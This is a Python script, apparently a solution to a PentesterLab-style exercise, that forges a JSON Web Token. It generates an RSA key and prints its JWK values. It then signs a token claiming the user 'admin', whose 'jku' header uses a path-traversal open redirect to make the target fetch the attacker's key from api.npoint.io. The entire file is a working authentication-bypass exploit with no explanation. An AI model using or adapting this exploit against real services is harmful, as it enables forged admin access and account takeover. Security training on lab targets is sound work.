import base64
import OpenSSL
import json
import hashlib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA,bits=2048)
priv = key.to_cryptography_key()
pub = priv.public_key()


e = pub.public_numbers().e
n = pub.public_numbers().n

finale= base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder='big')).decode('utf8').rstrip("=")
finaln= base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder='big')).decode('utf8').rstrip("=")
print ("e value:")
print (finale)
print ("n value:")
print (finaln)

#inp = input("Enter jku URL(with ""): ")
header = {"typ": "JWT","alg": "RS256","jku": "http://ptl-68b69bc8-5143cd1a.libcurl.so/.well-known/../redirect?redirect_uri=https://api.npoint.io/6df3eb3372992ab8e137"}
print(header)
payload = "eyJ1c2VyIjoiYWRtaW4ifQ"

str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=")+"."+payload

sig = priv.sign(bytes(str, encoding='utf8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

print(str+"."+base64.urlsafe_b64encode(sig).decode('utf8').rstrip("="))
